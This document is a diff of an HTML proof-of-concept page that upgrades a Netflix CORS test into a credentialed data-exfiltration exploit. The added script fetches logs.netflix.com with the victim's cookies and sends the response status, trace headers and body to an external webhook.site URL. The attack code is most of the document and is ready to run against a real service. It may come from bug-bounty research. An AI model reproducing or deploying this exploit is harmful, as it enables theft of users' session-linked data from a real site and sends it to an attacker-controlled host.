@@ -1,35 +1,54 @@
 <!DOCTYPE html>
 <html lang="en">
-<head><meta charset="utf-8" />
-<title>Netflix CORS PoC – logs endpoint</title>
+<head>
+<meta charset="UTF-8">
+<title>Netflix CORS PoC – credentialed data exfil</title>
 <style>
-  body{font-family:monospace;background:#111;color:#eee;padding:2rem}
-  button{padding:.5rem 1rem;font-size:1rem;cursor:pointer}
-  pre{background:#222;border-radius:6px;padding:1rem;max-height:420px;overflow:auto}
-</style></head>
+ body{font-family:monospace;background:#111;color:#eee;padding:2rem}
+ button{padding:.5rem 1rem;font-size:1rem;cursor:pointer}
+ pre{background:#222;border-radius:6px;padding:1rem;max-height:420px;overflow:auto}
+</style>
+</head>
 <body>
-<h2>Netflix CORS PoC – <code>/log/www/cl/2</code></h2>
-<button onclick="poc()">Run exploit</button>
+<h2>Netflix CORS PoC – <code>/log/www/cl/2</code></h2>
+
+<button onclick="exploit()">Run exploit & exfiltrate</button>
 <pre id="out">Click the button…</pre>
 
 <script>
-async function poc(){
-  const out=document.getElementById('out');
-  out.textContent='⏳ Sending GET…';
-  try{
-    const res=await fetch(
-      'https://logs.netflix.com/log/www/cl/2?dummy=1',
-      {credentials:'include'}
-    );
-    const txt=await res.text();
-    out.textContent=
-`Status   : ${res.status}
-nfstatus : ${res.headers.get('x-netflix.nfstatus')}
+/*  ============== CONFIG ==============  */
+const TARGET  = 'https://logs.netflix.com/log/www/cl/2';
+const EXFIL   = 'https://webhook.site/4e1148e7-6ade-4b05-86c9-fd4e86d6e8be?data=';   
+/*  =====================================  */
 
-${txt || '(empty body – read cross‑origin)'}`;
+async function exploit(){
+  const out = document.getElementById('out');
+  out.textContent='⏳ Sending credentialed request…';
+
+  try{
+    /* ---- 1. fetch victim data cross‑origin with cookies ---- */
+    const victimRes = await fetch(TARGET + '?dummy=1', {
+      method:'GET',
+      credentials:'include',   // ← sends SecureNetflixId, NetflixId, etc.
+      mode:'cors'
+    });
+
+    const body = await victimRes.text();    // body may be empty
+    /* ---- 2. exfiltrate status + headers + body to attacker ---- */
+    const leak = {
+      status     : victimRes.status,
+      nfstatus   : victimRes.headers.get('x-netflix.nfstatus'),
+      traceId    : victimRes.headers.get('x-b3-traceid'),
+      body
+    };
+
+    await fetch(EXFIL + encodeURIComponent(JSON.stringify(leak)));
+
+    out.textContent = '✅ Exfil sent! Data:\n' + JSON.stringify(leak,null,2);
   }catch(e){
-    out.textContent='❌ Blocked:\n'+e;
+    out.textContent='❌ Error:\n'+e;
   }
 }
 </script>
-</body></html>
+</body>
+</html>
